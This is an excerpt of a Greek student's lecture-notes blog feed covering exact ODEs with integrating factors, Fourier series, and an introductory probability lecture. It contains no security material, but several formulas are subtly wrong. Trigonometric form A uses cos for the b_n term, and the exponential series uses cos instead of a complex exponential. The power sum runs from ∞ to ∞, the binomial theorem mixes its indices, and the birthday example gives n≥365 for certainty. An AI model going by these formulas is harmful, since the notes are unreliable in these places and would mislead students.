Αποτελούν μια ιδιαίτερη <i>κατηγοριοποίηση</i> ΔΕ πρώτης τάξης της μορφής:
</p>
\begin{equation}
P(x,y)dx + Q(x,y)dy = 0
\end{equation}

<p>
<b>ΑΝ</b> ισχύει: \(\frac{\partial{P}}{\partial{y}}= \frac{\partial{Q}}{\partial{x}}\)
</p>

<p>
Σε αυτή την περίπτωση η λύση δίνεται από την:
</p>
\begin{equation}
\int_a^x P(t,y)dt + \int Q(a,y)dy = c\in \mathbb{R}
\end{equation}
</div>
<div id="outline-container-org072dbbc" class="outline-3">
<h3 id="org072dbbc"><span class="section-number-3">6.1.</span> <a href="#org072dbbc">Παρατήρηση</a></h3>
<div class="outline-text-3" id="text-6-1">
<p>
Στο ολοκλήρωμα η επιλογή της μεταβλητής \(a\) πρέπει να είναι καταλλήλως ορισμένη
<span class="underline">και</span> ιδανικά να βοηθάει με τις πράξεις ( συχνά καλή επιλογή αποτελεί το \(0\) )
</p>
</div>
</div>
<div id="outline-container-org9456278" class="outline-3">
<h3 id="org9456278"><span class="section-number-3">6.2.</span> <a href="#org9456278">Ολοκληρωτικός Παράγοντας</a></h3>
<div class="outline-text-3" id="text-6-2">
<p>
Υπο ορισμένες συνθήκες είναι δυνατός ο πολλαπλασιασμός της <span class="underline">μη πλήρους</span>
διαφορικής εξίσωσης με συνάρτηση \(R\) καταλλήλως ορισμένη έτσι ώστε η τελική
εξίσωση:
</p>
\begin{equation}
P\cdot R(x,y)dx + Q\cdot R(x,y)dy = 0
\end{equation}
<p>
Να είναι πλήρης και να μπορεί να επιλυθεί με τον γνωστό τρόπο.
</p>
</div>
</div>
<div id="outline-container-orge574fd1" class="outline-3">
<h3 id="orge574fd1"><span class="section-number-3">6.3.</span> <a href="#orge574fd1">Αναγωγή ΔΕ σε πλήρεις ΔΕ μέσω ολοκληρωτικού παράγοντα</a></h3>
<div class="outline-text-3" id="text-6-3">
<p>
Υπάρχουν ορισμένες περιπτώσεις στις οποίες ο ολοκληρωτικός παράγοντας προκύπτει
<i>τυποποιημένα</i>:
</p>
</div>
<ol class="org-ol">
<li><a id="org8bbe55f"></a><a href="#org8bbe55f">Απλή περίπτωση</a><br>
<div class="outline-text-5" id="text-6-3-0-1">
<p>
Συνήθως, μάλιστα, είναι εύκολο αν είναι κανεις προσεκτικός να παρατηρήσει αυτή
την περίπτωση.
</p>
<ol class="org-ol">
<li>\(\frac{1}{Q}(\frac{\partial{P}}{\partial{y}}-\frac{\partial{Q}}{\partial{x}})
   = F(x)\)
Σε αυτή την περίπτωση \(R(x) = e^{\int F(x)dx}\)</li>
<li>\(\frac{1}{P}(\frac{\partial{Q}}{\partial{x}}-\frac{\partial{P}}{\partial{y}})
   = F(y)\)
όπου \(R(y) = e^{\int F(y)dy}\)</li>
</ol>
</div>
</li>
<li><a id="orgdd23c0d"></a><a href="#orgdd23c0d">Σύνθετη</a><br>
<div class="outline-text-5" id="text-6-3-0-2">
<ol class="org-ol">
<li>\(\frac{1}{P-Q}(\frac{\partial{Q}}{\partial{x}}-\frac{\partial{P}}{\partial{y}})
   = F(x+y)\)
Τότε, για \(z=(x+y)\) ο ολοκληρωτικός παράγοντας είναι:
 \[
    R(z) = e^{\int F(z)dz}
    \]</li>
<li>\(\frac{1}{-(P+Q)}(\frac{\partial{Q}}{\partial{x}}-\frac{\partial{P}}{\partial{y}})
   = F(x-y)\)
Τότε, για \(z=(x-y)\) ο ολοκληρωτικός παράγοντας είναι:
 \[
    R(z) = e^{\int F(z)dz}
    \]</li>
</ol>
</div>
</li>
</ol>
<div id="outline-container-orgdbbeda5" class="outline-4">
<h4 id="orgdbbeda5"><span class="section-number-4">6.3.1.</span> <a href="#orgdbbeda5">Παρατηρήσεις</a></h4>
<div class="outline-text-4" id="text-6-3-1">
</div>
<ol class="org-ol">
<li><a id="org46337a1"></a><a href="#org46337a1">Προσοχή στο πρόσημο!</a><br>
<div class="outline-text-5" id="text-6-3-1-1">
<p>
Είναι πολύ εύκολο να κάνει κανείς λάθος στο πρόσημο σε κάποιο από τα στάδια
αναγωγής διαφορικής σε πλήρη ΔΕ, και το αποτέλεσμα να μην έχει καμία σχέση με το
σωστό.
</p>
</div>
<ol class="org-ol">
<li><a id="orgf1813c1"></a><a href="#orgf1813c1">Κανόνας για τον <i>ελεγχο</i> υποπεριπτώσεων:</a><br>
<div class="outline-text-6" id="text-6-3-1-1-1">
<p>
Γενικά η συνάρτηση που βρίσκεται στον παρονομαστή πολλαπλασιαζόμενη με την
μερική παράγωγο της πρέπει να έχει αρνητικό πρόσημο ( δες περιπτώσεις ). Τώρα,
εξαίρεση αποτελεί η δεύτερη <i>σύνθετη</i> περίπτωση, στην οποία μπορείς να σκέφτεσαι
ότι <i>προηγείται</i> το αρνητικό πρόσημο του \(Q\).
</p>
</div>
</li>
</ol>
</li>
</ol>
</div>
</div>
</div>
<div id="outline-container-orge16c9de" class="outline-2">
<h2 id="orge16c9de"><span class="section-number-2">7.</span> <a href="#orge16c9de">Μη γραμμικές ως προς την παράγωγο</a></h2>
<div class="outline-text-2" id="text-7">
<p>
Μία ΔΕ η οποία μπορεί να μετασχηματιστεί στην μορφή<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>:
</p>
\begin{equation}
(\frac{d{y}}{d{x}}-f_1(x,y))(\frac{d{y}}{d{x}}-f_2(x,y))=0
\end{equation}

<p>
Τότε, θεωρώντας πως
</p>
\begin{align}
y'=f_1\Rightarrow& g_1(x,y,c) = 0, c\in \mathbb{R}\\
y'=f_2\Rightarrow& g_2(x,y,c) = 0, c\in \mathbb{R}
\end{align}

<p>
Λύση της αρχικής εξίσωσης, σε πλεγμένη μορφή μπορεί να θεωρηθεί η:
</p>
\begin{equation}
g_1\cdot g_2=0
\end{equation}
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Μπορεί, με διαφορετικό βαθμό της ΔΕ να προκύψουν περισσότερες
<i>παραγοντοποιήσεις</i> και <i>υποεξισώσεις</i>. Τα παραπάνω παραμένουν αληθή.
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>Σειρές Fourier</title>
<link>posts/lectures/auth/em1/fourier_series.html</link>
<pubDate>Sat, 17 Dec 2022 00:00:00 +0200</pubDate>
<guid>posts/lectures/auth/em1/fourier_series.html</guid>
<description>
<![CDATA[<p>
Οι σειρές Fourier βρίσκουν εφαρμογή σε πολλούς διαφορετικούς τομείς. Ο
κρισιμότερος (από ότι φαίνεται) για τους μηχανικούς είναι η σχέση που έχουν με
τον μετασχηματισμό Fourier, επιτρέποντας μας να πάμε από το πεδίο του χρόνου
στο πεδίο της συχνότητας.
</p>
<div id="outline-container-org92cc8c7" class="outline-2">
<h2 id="org92cc8c7"><span class="section-number-2">1.</span> <a href="#org92cc8c7">Fourier και διατύπωση συνάρτησης με την χρήση βάσεων</a></h2>
<div class="outline-text-2" id="text-1">
<p>
Είναι σημαντικό να καταλάβουμε πως οι σειρές Fourier είναι κάτι παραπάνω από την
ανάλυση μίας συνάρτησης σε άθροισμα επιμέρους συναρτήσεων (τριγωνικής ή
εκθετικής) μορφής.
</p>

<p>
Αποτελεί, στην πραγματικότητα, την ανάλυση της συνάρτησης σε άθροισμα των <b>βάσεων</b>
του εξεταζόμενου χώρου, σε ορθογώνιες, δηλαδή, μεταξύ τους συνιστώσες.
</p>

<p>
Αποδεικνύεται πως βάσεις στον πραγματικό και τον μιγαδικό χώρο αντίστοιχα
αποτελούν οι συναρτήσεις:
</p>
\begin{align}
\label{eq:4}
\frac{\sqrt{2}}{T}\cos{\left(n\omega_0t\right)}\\
\frac{\sqrt{2}}{T}\sin{\left(n\omega_0t\right)}\\
\frac{\sqrt{1}}{T}e^{jn\omega_0t}
\end{align}
</div>
</div>
<div id="outline-container-orgee4e410" class="outline-2">
<h2 id="orgee4e410"><span class="section-number-2">2.</span> <a href="#orgee4e410">Τύποι</a></h2>
<div class="outline-text-2" id="text-2">
<p>
Καθώς είδαμε στις  \(~(\eqref{eq:4})\) τις <i>βάσεις</i> του μιγαδικού και του πραγματικού
χώρου αντίστοιχα είναι αναμενόμενο το να μπορούμε να εκφράσουμε μία τυχαία
συνάρτηση ως άθροισμα αυτών ( με κατάλληλους συντελεστές ). Και αυτό συμβαίνει
<span class="underline">σχεδόν</span> σε όλες τις περιπτώσεις (<a href="#org49a796a">Συνθήκες Dirichlet</a>).
</p>
<ol class="org-ol">
<li>Τριγωνομετρική (Trigonometric):</li>
</ol>
\begin{align}
\label{eq:1}
\hat{f} &= 
\frac{a_0}{2}+ \sum_{n=1}^{\infty}a_n \cos{\left(n\omega_0t\right)}+
\sum_{n=1}^{\infty}b_n \cos{\left(n\omega_0t\right)}&\text{type A}\\
\label{eq:2}
\hat{f} &= 
\frac{A_0}{2}+ \sum_{n=1}^{\infty}A_n \cos{\left( n\omega_0t \right) + \phi_{n}}&\text{type B}
\end{align}
<ol class="org-ol">
<li>Εκθετική (Complex Exponential)</li>
</ol>
\begin{equation}
\label{eq:3}
\hat{f} = \sum_{n=-\infty}^{\infty}f_n \cos{\left(n\omega_0t\right)}
\end{equation}
</div>
<div id="outline-container-org0e107cd" class="outline-3">
<h3 id="org0e107cd"><span class="section-number-3">2.1.</span> <a href="#org0e107cd">Σχόλιο για τους συντελεστές</a></h3>
<div class="outline-text-3" id="text-2-1">
<div class="note" id="org4817005">
<p>
Ο όρος μπροστά αποτελεί κανονικοποίηση και προκύπτει από τον ορισμό εν τέλη των
βάσεων ( Το \(\cos{\left(n\omega_0t\right)}\) δεν αποτελεί βάση αλλά το
\(\sqrt{\frac{2}{T}}\cos{\left(n\omega_0t\right)}\) είναι)
</p>

</div>

<p>
Οι συντελεστές των βάσεων στις παραπάνω εξισώσεις
(\(\eqref{eq:1},~(\eqref{eq:2}),~(\eqref{eq:3})\)), δεν είναι παρά οι προβολές 
της συνάρτησης επί των αντίστοιχων βάσεων:
</p>
\begin{align}
\label{eq:6}
a_n &= \frac{2}{T}\int_{t_1}^{t_1+T} f(t)\cos{\left(n\omega_0t\right)}dt\\
b_n &= \frac{2}{T}\int_{t_1}^{t_1+T} f(t)\sin{\left(n\omega_0t\right)}dt\\
F_n &= \frac{1}{T}\int_{t_1}^{t_1+T} f(t)e^{-\jmath\omega_0nt}dt
\end{align}

<p>
ενώ για τον τριγωνομετρικό τύπο Β (που δεν είναι παρα μία εναλλακτική /αποτύπωση
του Α):
</p>

\begin{align}
\label{eq:12}
A_0 &= \frac{a_0}{2}\\
A_n &= \sqrt{a_n^2+b_n^2}\\
\phi_n &= \arctan{\left(\frac{b_n}{a_n}\right)}
\end{align}

<p>
Ακόμα, αν και δεν είναι <i>τόσο</i> σημαντικό, ενδιαφέρουσα είναι και η σχέση μεταξύ
του τριγωνομετρικού τύπου Β και του εκθετικού:
</p>
\begin{align*}
A_n &= 2|F_n|\\
\phi_{n} &= args{F_{n}}
\end{align*}

<p>
Ενώ ακόμα εύκολα αποδεικνύεται
</p>
\begin{align}
F_0 &= \frac{a_0}{2}\\
F_n &= \frac{1}{2}(a_n-\jmath b_n)
\end{align}
</div>
</div>
</div>
<div id="outline-container-org49a796a" class="outline-2">
<h2 id="org49a796a"><span class="section-number-2">3.</span> <a href="#org49a796a">Συνθήκες Dirichlet</a></h2>
<div class="outline-text-2" id="text-3">
<p>
Για να μπορεί μια συνάρτηση να αναπτυχθεί ως σειρά Fourier πρέπει:
</p>
<ol class="org-ol">
<li>Να έχει πεπερασμένο αριθμό μεγίστων και ελαχίστων σε πεπερασμένο διάστημα</li>
<li>Να έχει πεπερασμένο αριθμό ασυνεχειών.</li>
<li>Να είναι απολύτως ολοκληρώσιμη.</li>
</ol>
\begin{equation}
\label{eq:13}
\int_{-\infty}^{\infty} |f(t)|dt < \infty
\end{equation}
</div>
</div>
<div id="outline-container-orgab7fa40" class="outline-2">
<h2 id="orgab7fa40"><span class="section-number-2">4.</span> <a href="#orgab7fa40">Συμμετρία και συντελεστές</a></h2>
<div class="outline-text-2" id="text-4">
<p>
Γενικά ισχύει πως κάθε συνάρτηση μπορεί να εκφραστεί ως άθροισμα δύο <i>επιμέρους</i>
συναρτήσεων: Μιας άρτιας και μίας περιττής, ούτως ώστε:
</p>
\begin{equation}
\label{eq:14}
f(t) = f_o(t) + f_e(t)
\end{equation}
<p>
Γεγονός που καθίσταται ιδιαίτερα εμφανές με τις σειρές Fourier, καθώς:
</p>
\begin{align*}
f_o(t) &= \sum_{n=1}^{\infty} b_n\sin{\left(n\omega_0t\right)}\\
f_e(t) &= \frac{a_0}{2}+\sum_{n=1}^{\infty} a_n\cos{\left(n\omega_0t\right)}\\
\end{align*}

<p>
Αυτό με την σειρά του δημιουργεί τις προϋποθέςσεις για τις παρακάτω ιδιότητες:
</p>
</div>
<div id="outline-container-orge8c39cc" class="outline-3">
<h3 id="orge8c39cc"><span class="section-number-3">4.1.</span> <a href="#orge8c39cc">Είδη συμμετρίας και σχέση με τους συντελεστές.</a></h3>
<div class="outline-text-3" id="text-4-1">
</div>
<div id="outline-container-orgfda7f33" class="outline-4">
<h4 id="orgfda7f33"><span class="section-number-4">4.1.1.</span> <a href="#orgfda7f33">Αν η \(f\) άρτια συμμετρική</a></h4>
<div class="outline-text-4" id="text-4-1-1">
<p>
Τότε θα είναι \(f(t) = f_e(t) \Rightarrow b_n = 0\)
</p>
</div>
</div>
<div id="outline-container-org1ab4458" class="outline-4">
<h4 id="org1ab4458"><span class="section-number-4">4.1.2.</span> <a href="#org1ab4458">Αν η \(f\) περιττά συμμετρική</a></h4>
<div class="outline-text-4" id="text-4-1-2">
<ul class="org-ul">
<li>\(f(t) = f_o(t)\Rightarrow a_n = 0\)</li>
<li>\(\text{avg} = 0 \Rightarrow a_{0} = 0\)</li>
</ul>
</div>
</div>
<div id="outline-container-orgc0cee97" class="outline-4">
<h4 id="orgc0cee97"><span class="section-number-4">4.1.3.</span> <a href="#orgc0cee97">Συμμετρία μισού μήκους</a></h4>
<div class="outline-text-4" id="text-4-1-3">
<p>
Συμμετρία μισού μήκους υφίσταται όταν για το περιοδικό σήμα \(x(t)\) ικανοποιείται
η:
</p>
\begin{equation}
\label{eq:15}
x(t) = -x(t+ \frac{T}{2})
\end{equation}

<p>
Σε αυτή την περίπτωση θα υπάρχουν μόνο <i>περιττές</i> αρμονικές: \(n=2\kappa+1, \kappa\in {\mathbb R}\):
</p>
\begin{align*}
a_n,b_n =
\begin{cases}
0, n = 2\kappa\\
(\eqref{eq:6}), n = 2\kappa+1\\
\end{cases}
\end{align*}
</div>
</div>
<div id="outline-container-orge6c08ac" class="outline-4">
<h4 id="orge6c08ac"><span class="section-number-4">4.1.4.</span> <a href="#orge6c08ac">Συμμετρία τετάρτου μήκους</a></h4>
<div class="outline-text-4" id="text-4-1-4">
<p>
Ουσιαστικά αποτελεί συνδυασμό συμμετρίας μισού μήκους και άρτιας/περιττής. Οπότε
έχουμε μόνο περιττές αρμονικές, και μόνο \(a_n\) (άρτια συμμετρία) ή μόνο \(b_n\)
(περιττή συμμετρία)
</p>
</div>
</div>
</div>
</div>
<div id="outline-container-org1ddb0c5" class="outline-2">
<h2 id="org1ddb0c5"><span class="section-number-2">5.</span> <a href="#org1ddb0c5">Ενέργεια και ισχύς σειρών Fourier</a></h2>
<div class="outline-text-2" id="text-5">
<p>
Από τον ορισμό της μέσης ισχύος έχουμε:
</p>
\begin{equation}
\label{eq:18}
{\bar P} = \frac{1}{T}\int_{t_1}^{t_1+T}f^2(t)dt
\end{equation}

<p>
Το οποίο κατα την έκφραση των περιοδικών συναρτήσεων με Fourier series, μπορεί
να γραφεί ως εξής:
</p>
\begin{align}
\label{eq:17}
{\bar P} &= \frac{a_0^2}{4} + \frac{1}{2}\sum_{n=1}^{\infty}(a_n^2+b_n^2) &\text{type A}\\
{\bar P} &= \frac{A_0^2}{2} + \frac{1}{2}\sum_{n=1}^{\infty}A_n^2 &\text{type B}\\
{\bar P} &= \sum^{\infty}_{n=\infty} |F_{n}|^2
\end{align}
</div>
</div>
<div id="outline-container-org16c4862" class="outline-2">
<h2 id="org16c4862"><span class="section-number-2">6.</span> <a href="#org16c4862">Resources:</a></h2>
<div class="outline-text-2" id="text-6">
<ul class="org-ul">
<li><a href="https://www.youtube.com/watch?v=9R3-0-Xg_Ro&amp;list=PLBlnK6fEyqRiikSSOMCdErAdxvmGpzFQq">Fourier Series Neso Academy</a></li>
<li>Πανάς (εξαιρετικές σημειώσεις και αξίζει)</li>
<li><a href="https://www.youtube.com/watch?v=28oKg7GMbvI&amp;list=PLX2gX-ftPVXVScC8Hz8nmcZTAMXTluTIn">Michel Van Biezen</a></li>
</ul>
</div>
</div>
]]>
</description></item>
<item>
<title>Εισαγωγική Διάλεξη</title>
<link>posts/lectures/auth/pts/lec_PTS_1_20220315_lec1.html</link>
<pubDate>Fri, 11 Mar 2022 00:00:00 +0200</pubDate>
<guid>posts/lectures/auth/pts/lec_PTS_1_20220315_lec1.html</guid>
<description>
<![CDATA[<div id="outline-container-org9ab0e4d" class="outline-2">
<h2 id="org9ab0e4d"><span class="section-number-2">1.</span> <a href="#org9ab0e4d">Γενικά περί μαθήματος</a></h2>
<div class="outline-text-2" id="text-1">
<p>
<i>Λίγο πολύ όλα τα εισαγωγικά φαίνεται να υπάρχουν στο elearning</i>
</p>
</div>
<div id="outline-container-org11f0ba9" class="outline-3">
<h3 id="org11f0ba9"><span class="section-number-3">1.1.</span> <a href="#org11f0ba9">Βαθμολογία</a></h3>
<div class="outline-text-3" id="text-1-1">
<p>
Στο μάθημα υπάρχουν δύο <i>εργασίες</i> η μία με την μορφή κουίζ πάνω στο πρώτο μέρος
του μαθήματος ( πιθανότητες ), ενώ η δεύτερη με την μορφή προγράμματος πάνω στο
SPSS. Η κάθε μία εκ των εργασιών πιάνει 2 βαθμούς στον τελικό βαθμό του
μαθήματος ενώ οι υπόλοιποι 8 βαθμοί, προφανώς, δίνονται από τις τελικές εξετάσεις
</p>
</div>
</div>
<div id="outline-container-org1fd77a1" class="outline-3">
<h3 id="org1fd77a1"><span class="section-number-3">1.2.</span> <a href="#org1fd77a1">Ώρες</a></h3>
<div class="outline-text-3" id="text-1-2">
<p>
Υπήρξε μια <i>αλλαγή</i> στις Δευτέρες (πιθανά για μόνο μία εβδομάδα), συμφωνα με την
οποία το μάθημα πάει από <span class="timestamp-wrapper"><span class="timestamp">&lt;2022-03-13 Sun 18:00-20:00&gt; </span></span> στις
<span class="timestamp-wrapper"><span class="timestamp">&lt;2022-03-13 Sun 17:00-19:00&gt;</span></span>.
</p>
</div>
</div>
<div id="outline-container-orgf4b9dff" class="outline-3">
<h3 id="orgf4b9dff"><span class="section-number-3">1.3.</span> <a href="#orgf4b9dff">Βιβλία</a></h3>
<div class="outline-text-3" id="text-1-3">
<p>
Για βιβλία, ενθαρρύνεται η μελέτη με πολλά ηλεκτρονικά συγγράμματα από τον
Εύδοξο. Δίνονται τίτλοι και οδηγίες στο elearning του μαθήματος.
</p>

<p>
Ακόμα στο δεύτερο μέρος του μαθήματος έχει online σημειώσεις.
</p>
</div>
</div>
<div id="outline-container-org533801d" class="outline-3">
<h3 id="org533801d"><span class="section-number-3">1.4.</span> <a href="#org533801d">Ύλη ( Συνοπτικά )</a></h3>
<div class="outline-text-3" id="text-1-4">
</div>
<div id="outline-container-orgda834e3" class="outline-4">
<h4 id="orgda834e3"><span class="section-number-4">1.4.1.</span> <a href="#orgda834e3">Πρώτο μέρος ( Θεωρία πιθανοτήτων )</a></h4>
<div class="outline-text-4" id="text-1-4-1">
<ol class="org-ol">
<li>Βασικές έννοιες πιθανότητας</li>
<li>Τυχαίες μεταβλητές και συναρτήσεις πιθανότητας</li>
<li>Θεωρητικές συναρτήσεις κατανομής και πυκνότητας</li>
<li>Συναρτήσεις τυχαίας μεταβλητής</li>
</ol>
</div>
</div>
<div id="outline-container-orgd05dadf" class="outline-4">
<h4 id="orgd05dadf"><span class="section-number-4">1.4.2.</span> <a href="#orgd05dadf">Δεύτερο μέρος ( Στατιστική )</a></h4>
<div class="outline-text-4" id="text-1-4-2">
<ol class="org-ol">
<li>Περιγραφική στατιστική</li>
<li>Εκτίμηση παραμέτρων</li>
<li>Συσχέτιση και παλινδρόμηση</li>
</ol>
</div>
</div>
</div>
</div>
<div id="outline-container-orgf9f9f87" class="outline-2">
<h2 id="orgf9f9f87"><span class="section-number-2">2.</span> <a href="#orgf9f9f87">Βασικές έννοιες</a></h2>
<div class="outline-text-2" id="text-2">
<p>
Σχεδόν όλα τα φαινόμενα που μπορεί κανείς να σκεφτεί δεν είναι βέβαιο ότι θα
συμβούν, απλά πιθανό. Οι πιθανότητες να γίνουν πραγματικότητα καθορίζονται από
ορισμένες παραμέτρους.
</p>

<p>
Έτσι, τα περισσότερα φαινόμενα, <i>αβέβαια ή τυχαία</i>, τα προσεγγίζουμε με την
χρήση <i>πιθανοκρατικών-στατιστικών</i> μοντέλων, ενώ τα, ελάχιστα, <i>βέβαια</i>
φαινόμενα, όποια και αν είναι αυτά, τα προσεγγίζουμε με την χρήση καθοριστικών
μοντέλων.
</p>
</div>
<div id="outline-container-org0625cbb" class="outline-3">
<h3 id="org0625cbb"><span class="section-number-3">2.1.</span> <a href="#org0625cbb">Τυχαιότητα \(e\)</a></h3>
<div class="outline-text-3" id="text-2-1">
<p>
Δεν ξέρω αν θα μπορούσε πιθανά να αναφέρεται σε ένα γενικότερο συντελεστή λάθους
/ απόκλισης, αντίστοιχου εκείνου που συχνά κανείς θα δεί σε διαλέξεις του Lewin.
Ειπώθηκε, πως στην πραγματικότητα είναι απειροελάχιστα τα φαινόμενα στους
υπολογισμούς των οποίων δεν είναι απαραίτητη η χρήση του <i>συντελεστή
τυχαιότητας</i> \(+e\)
</p>
</div>
</div>
</div>
<div id="outline-container-org5dec9f7" class="outline-2">
<h2 id="org5dec9f7"><span class="section-number-2">3.</span> <a href="#org5dec9f7">Ορολογία</a></h2>
<div class="outline-text-2" id="text-3">
<p>
<i>Προτίμησα να προηγείται η ορολογία των παραδειγμάτων έτσι ώστε, αν κανείς
θέλει, να μπορεί να εξετάσει την κατανόηση της σε εκείνα</i>
</p>
<ul class="org-ul">
<li><b>Παράδειγμα - Experiment</b>
Επαναλήψιμη διαδικασία με κάποιο αποτέλεσμα ( outcome )</li>
<li><b>Δειγματοχώρος - Sample space</b> \(S\)
Το σύνολο των αποτελεσμάτων</li>
<li><b>Δειγματοσημείο - Sample point</b>
Ένα εκ των αποτελεσμάτων</li>
<li><b>Γεγονός - Event</b>
Ένα η περισσότερα αποτελέσματα ( καλώς ορισμένο σύνολο )</li>
</ul>
</div>
<div id="outline-container-org3e0fb2d" class="outline-3">
<h3 id="org3e0fb2d"><span class="section-number-3">3.1.</span> <a href="#org3e0fb2d">Δυναμοσύνολο.</a></h3>
<div class="outline-text-3" id="text-3-1">
<p>
Το σύνολο πιθανών υποσυνόλων του \(S\). Συνδέοντας το με την ορολογία που είδαμε
προηγουμένως, το \(S\) είναι <b>βέβαιο γεγονός</b>.
</p>
\begin{align*}
S &= \{s_1,s_2,\cdots,s_n\}\\
S^{*} &= \{\emptyset,\{s_1\},\{s_2\}\cdots,\{s_n\}\\,& \{s_1,s_2\} \{s_1,s_3\} \cdots \{s_{n-1},s_{n}\}\cdots \}\\
\end{align*}

<p>
Ο παραπάνω τύπος προκύπτει μαθηματικά από το:
</p>
<div class="theorem" id="org6e174d4">
<p>
<b>Διώνυμο του Newton</b>:
</p>
\begin{align*}
(a+b)^n=\sum^n_{l=0} (\binom{n}{k})a^lb^{n-l} = \cdots\\
\end{align*}

</div>

<p>
Σε ένα βιβλίο του Σέρλοκ τίθεται ο γρίφος του πόσα μηνύματα μπορεί να περάσει
ένα σύστημα γεμάτων-ή-άδειων <i>κύκλων</i>. Πρόκειται για συσκευές που είχαν ανα
κάποια χιλιόμετρα με σκοπό να μεταδίδουν μηνύματα γρήγορα;
Αρχίζουμε από την πρώτη τρύπα:
</p>
<ol class="org-ol">
<li>Η τρύπα έχει δύο καταστάσεις (ανοιχτή/κλειστή), επομένως για κάθε πιθανό
συνδυασμό που έχει προκύψει από τις προηγούμενες <i>μελέτες</i> έχουμε δύο πιθανές
συνέχειες.</li>
<li>Πολλαπλασιάζουμε λοιπόν όλες τις ήδη υπάρχουσες καταστάσεις επί του δύο (
εκτός αν ήμαστε στην πρώτη τρύπα οπότε θέτουμε τις καταστάσεις σε 2 )</li>
</ol>
</div>
</div>
<div id="outline-container-org9a5c7e6" class="outline-3">
<h3 id="org9a5c7e6"><span class="section-number-3">3.2.</span> <a href="#org9a5c7e6">Πράξεις γεγονότων.</a></h3>
<div class="outline-text-3" id="text-3-2">
<p>
Για \(A,B\) γεγονότα του \(S\)
</p>
<ul class="org-ul">
<li><b>Ισότητα:</b>  \(A=B\)
Ίδια δειγματοσημεία</li>
<li><b>Ξένα/Ασυμβίβαστα:</b> \(A\cap B\)
Αν η τομή του δειγματοχώρου τους έιναι το μηδενικό σύνολο</li>
<li><b>Συμπλήρωμα:</b> \(\bar{A}\)
Όλα τα σημεία του \(S\notin A\)</li>
<li><b>Ένωση:</b> \(A\cup B\)
Ολα τα σημεία ανήκουν ή στο A <span class="underline">ή</span> στο \(B\)</li>
<li><b>Τομή:</b> \(A\cap B\)
Που ανήκουν και στα δύο ( προφανώς )</li>
<li><b>Διαφορά:</b> \(A-B = A\cap \bar{B}\)
Που ανήκουν στο ένα και όχι στο άλλο</li>
</ul>

<p>
Οι πράξεις αυτές μπορούν εύκολα να γίνουν εικόνες με την χρήση διαγραμμάτων Venn.
</p>
</div>
<div id="outline-container-orgcc77e4c" class="outline-4">
<h4 id="orgcc77e4c"><span class="section-number-4">3.2.1.</span> <a href="#orgcc77e4c">De Morgan: αρχή του δυισμού</a></h4>
<div class="outline-text-4" id="text-3-2-1">
\begin{align}
\bar{(A\cap B)} = \bar{A}\cup \bar{B}\\
\bar{A\cup B} = \bar{A}\cap \bar{B}
\end{align}
</div>
</div>
<div id="outline-container-org0408849" class="outline-4">
<h4 id="org0408849"><span class="section-number-4">3.2.2.</span> <a href="#org0408849">Παράδειγμα</a></h4>
<div class="outline-text-4" id="text-3-2-2">
<p>
Βάση των προηγουμένων, με άλγεβρα γεγονότων, να γραφούν τα παρακάτω
</p>
<ol class="org-ol">
<li>Τουλάχιστον ένα από τα \(A,B,C\)
\(P = A \cup B \cup C\)</li>
<li>Μόνο ένα από τα \(A,B,C\)
\(P = A\cup B \cup C - A\cap B - A\cap C - B\cap C\)</li>
<li>Μόνο δύο από τα \(A,B,C\)
\(P = \cdots\)</li>
</ol>
</div>
</div>
</div>
</div>
<div id="outline-container-org388a856" class="outline-2">
<h2 id="org388a856"><span class="section-number-2">4.</span> <a href="#org388a856">Θεωρία πιθανοτήτων</a></h2>
<div class="outline-text-2" id="text-4">
<p>
Μερικά εισαγωγικά παραδείγματα, τα οποία δείχνουν πως η <i>λογική</i> κάτω από
ορισμένες συνθήκες μας κάνει να μην καταλαβαίνουμε τις πραγματικές πιθανότητες
να συμβεί κάποιο γεγονός.
</p>
</div>
<div id="outline-container-orgd61492a" class="outline-4">
<h4 id="orgd61492a"><span class="section-number-4">4.0.1.</span> <a href="#orgd61492a">Γενέθλια την ίδια μέρα</a></h4>
<div class="outline-text-4" id="text-4-0-1">
<p>
Έστω ότι σε ένα δωμάτιο βρίσκονται \(n\) άτομα. Τι τιμή πρέπει να λάβει το \(n\)
έτσι ώστε:
</p>
<ul class="org-ul">
<li>Να είναι σίγουρο ότι δύο άτομα έχουν γενέθλια την ίδια μέρα; \(n\geq 365\)</li>
<li>Να είναι πιο πιθανό να έχουν την ίδια μέρα γενέθλια δύο άτομα  απο ότι να μην
έχουν; \(n \geq 23\)</li>
</ul>
</div>
</div>
<div id="outline-container-org83a2061" class="outline-4">
<h4 id="org83a2061"><span class="section-number-4">4.0.2.</span> <a href="#org83a2061">Ρίψη Νομίσματος</a></h4>
</div>

<div id="outline-container-orge1c33e0" class="outline-4">
<h4 id="orge1c33e0"><span class="section-number-4">4.0.3.</span> <a href="#orge1c33e0">Διάρκεια καλής λειτουργίας λαμπτηρα</a></h4>
</div>
<div id="outline-container-org0ac8a10" class="outline-4">
<h4 id="org0ac8a10"><span class="section-number-4">4.0.4.</span> <a href="#org0ac8a10">Ελαττωματικά τεμάχια</a></h4>
<div class="outline-text-4" id="text-4-0-4">
\begin{equation}
S = \{0,1,2,\cdots\}
\end{equation}
</div>
</div>
<div id="outline-container-orge365289" class="outline-4">
<h4 id="orge365289"><span class="section-number-4">4.0.5.</span> <a href="#orge365289">Διάρκεια καλής λειτουργίας λαμπτήρα</a></h4>
<div class="outline-text-4" id="text-4-0-5">
\begin{equation}
S = \{x| x\in \mathbb{R} \}
\end{equation}
</div>
</div>
<div id="outline-container-org2020512" class="outline-4">
<h4 id="org2020512"><span class="section-number-4">4.0.6.</span> <a href="#org2020512">Αριθμός σωματιδίων σε ραδιενεργό σώμα</a></h4>
</div>
</div>
<div id="outline-container-org60d5d71" class="outline-2">
<h2 id="org60d5d71"><span class="section-number-2">5.</span> <a href="#org60d5d71">Counting - Απαρίθμηση</a></h2>
<div class="outline-text-2" id="text-5">
<p>
Γενικά ένας εύκολος τρόπος με τον οποίο μπορεί κανείς να σχηματίσει έναν <i>νοητό</i>
χάρτη για τις πιθανές τελικές καταστάσεις είναι τα δενδροδιαγράμματα: (tree diagrams)
</p>

<p>
Παρόλα αυτά, δεν είναι πάντοτε αρκετά περιορισμένος ο αριθμός των γεγονότων ώστε
